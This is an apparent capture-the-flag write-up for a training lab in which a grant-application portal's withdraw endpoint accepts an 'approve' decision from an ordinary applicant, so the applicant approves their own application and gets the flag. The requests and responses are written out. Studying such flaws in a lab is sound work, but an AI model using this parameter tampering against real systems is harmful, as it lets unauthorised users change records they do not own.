---

Name: Briarcliff Foundation
Difficulty: Medium
URL: https://dashboard.webverselabs-pro.com/learning-paths/junior-web-hacker/04/rubber-stamp
Description: Briarcliff Foundation has accepted humanities and historical-preservation proposals through the same Fluxx-style applicant portal since 2018. The withdraw-application control was added late in development to spare the committee from clearing dead applications, and it shares plumbing with the committee's own review tooling. 

---

## Initial Request

The application has a **Withdraw Application** control. When using it, the browser sends a request to:

```http
POST /api/applications/BCF-2026-0148/decision
```

with the following JSON body:

```json
{
  "decision": "withdraw",
  "comment": ""
}
```

The important part of the request is the `decision` parameter:

```json
{
  "decision": "withdraw"
}
```

The challenge description mentions that the withdrawal functionality **shares plumbing with the committee's review tooling**, which suggests that the endpoint may support other decision types besides `withdraw`.

## Testing Other Decisions

I first tried changing the decision to `review`:

```json
{
  "decision": "review",
  "comment": ""
}
```

The server responded with:

```text
Unknown decision 'review'.
```

This confirmed that the `decision` value is processed server-side and that `review` was not one of the accepted values.

Since the description specifically mentioned committee review tooling, I then tried another likely committee action:

```json
{
  "decision": "approve",
  "comment": ""
}
```

## Exploitation

The modified request was:

```http
POST /api/applications/BCF-2026-0148/decision
```

```json
{
  "decision": "approve",
  "comment": ""
}
```

Unlike `review`, the `approve` decision was accepted.

The application was immediately marked as **accepted**, even though I was logged in through the normal applicant account and should only have been able to withdraw my own application.

The application was then accepted and the flag was revealed.
